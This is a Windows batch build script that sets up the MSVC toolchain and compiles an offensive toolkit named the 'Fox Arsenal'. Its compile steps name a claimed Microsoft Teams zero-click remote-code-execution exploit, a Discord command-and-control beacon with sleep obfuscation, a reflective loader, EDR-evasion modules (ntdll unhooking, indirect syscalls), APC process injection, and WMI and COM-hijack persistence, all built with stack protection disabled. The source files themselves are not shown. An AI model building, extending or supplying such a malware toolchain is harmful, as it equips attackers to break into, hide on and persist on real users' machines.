@echo off
setlocal enabledelayedexpansion

:: Set the working directory to the location of the batch file
cd /d "%~dp0"

echo [*] Starting Compilation of the Fox Arsenal...

:: Attempt to initialize the MSVC environment
set "VCVARS="
if exist "%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe" (
    for /f "usebackq tokens=*" %%i in (`"%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe" -latest -products * -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath`) do (
        if exist "%%i\VC\Auxiliary\Build\vcvarsall.bat" set "VCVARS=%%i\VC\Auxiliary\Build\vcvarsall.bat"
    )
)

if not defined VCVARS (
    if exist "C:\Program Files (x86)\Microsoft Visual Studio\18\BuildTools\VC\Auxiliary\Build\vcvarsall.bat" set "VCVARS=C:\Program Files (x86)\Microsoft Visual Studio\18\BuildTools\VC\Auxiliary\Build\vcvarsall.bat"
    if exist "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvarsall.bat" set "VCVARS=C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvarsall.bat"
    if exist "C:\Program Files\Microsoft Visual Studio\2022\Professional\VC\Auxiliary\Build\vcvarsall.bat" set "VCVARS=C:\Program Files\Microsoft Visual Studio\2022\Professional\VC\Auxiliary\Build\vcvarsall.bat"
    if exist "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvarsall.bat" set "VCVARS=C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvarsall.bat"
)

if defined VCVARS (
    echo [*] Initializing MSVC Environment using: %VCVARS%
    call "%VCVARS%" x64 >nul
) else (
    echo [-] Warning: Could not automatically locate vcvarsall.bat.
    echo [-] Ensure you are running this from the "x64 Native Tools Command Prompt for VS".
)

:: Check if INCLUDE is set (meaning vcvarsall.bat worked)
if not defined INCLUDE (
    echo [-] Warning: Environment variables not set. Attempting aggressive fallback for Windows 11 SDK...
    
    :: Find MSVC Tools
    set "MSVC_INC="
    set "MSVC_LIB="
    for /d %%i in ("%ProgramFiles(x86)%\Microsoft Visual Studio\18\BuildTools\VC\Tools\MSVC\*") do (
        if exist "%%i\include\stdio.h" (
            set "MSVC_INC=/I"%%i\include""
            set "MSVC_LIB=/LIBPATH:"%%i\lib\x64""
        )
    )
    
    :: Find Windows 11/10 SDK
    set "WIN_SDK_INC="
    set "WIN_SDK_LIB="
    for /d %%i in ("%ProgramFiles(x86)%\Windows Kits\10\Include\*") do (
        if exist "%%i\um\windows.h" (
            set "WIN_SDK_INC=/I"%%i\um" /I"%%i\shared" /I"%%i\ucrt""
            set "WIN_SDK_LIB=/LIBPATH:"%ProgramFiles(x86)%\Windows Kits\10\Lib\%%~nxi\um\x64" /LIBPATH:"%ProgramFiles(x86)%\Windows Kits\10\Lib\%%~nxi\ucrt\x64""
        )
    )
    
    if not defined WIN_SDK_INC (
        echo [-] CRITICAL: Windows 11 SDK not found. You MUST install it via the Visual Studio Installer.
        exit /b 1
    )
    
    set "ALL_INCLUDES=!MSVC_INC! !WIN_SDK_INC!"
    set "ALL_LIBS=!MSVC_LIB! !WIN_SDK_LIB!"
) else (
    set "ALL_INCLUDES="
    set "ALL_LIBS="
)

:: Create a bin directory for the output
if not exist "bin" mkdir bin

echo [*] Compiling CVE-2025-23198 (Microsoft Teams Zero-Click RCE)...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG !ALL_INCLUDES! /Tc cve_2025_23198_teams_rce.cpp /link !ALL_LIBS! /OUT:bin\teams_rce.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

echo [*] Compiling Native Discord C2 Beacon (v2) with Ekko Sleep...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG !ALL_INCLUDES! /Tc discord_c2_v2\main_beacon_v2.cpp /Tc discord_c2_v2\sleep_ekko.cpp /link !ALL_LIBS! /OUT:bin\beacon_v2.exe /SUBSYSTEM:WINDOWS /MACHINE:x64

echo [*] Compiling Custom Reflective Loader (sRDI)...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG !ALL_INCLUDES! /Tc discord_c2_v2\reflective_loader.cpp /link !ALL_LIBS! /OUT:bin\loader.exe /SUBSYSTEM:WINDOWS /MACHINE:x64

echo [*] Compiling Evasion (Ntdll Unhooking)...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG !ALL_INCLUDES! /Tc discord_c2_v2\evasion_native.cpp /link !ALL_LIBS! /OUT:bin\evasion.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

echo [*] Compiling Indirect Syscalls (Halo's Gate)...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG !ALL_INCLUDES! /Tc discord_c2_v2\injection_indirect_syscalls.cpp /link !ALL_LIBS! /OUT:bin\syscalls.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

echo [*] Compiling APC Injection...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG !ALL_INCLUDES! /Tc discord_c2_v2\injection_apc.cpp /link !ALL_LIBS! /OUT:bin\apc_inject.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

echo [*] Compiling WMI Persistence...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG !ALL_INCLUDES! /Tc discord_c2_v2\persistence_wmi.cpp /link !ALL_LIBS! /OUT:bin\persist_wmi.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

echo [*] Compiling COM Hijacking Persistence...
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG !ALL_INCLUDES! /Tc discord_c2_v2\persistence_com_hijack.cpp /link !ALL_LIBS! /OUT:bin\persist_com.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

:: Clean up object files
del *.obj >nul 2>&1

echo [*] Compilation complete. Check the 'bin' folder.
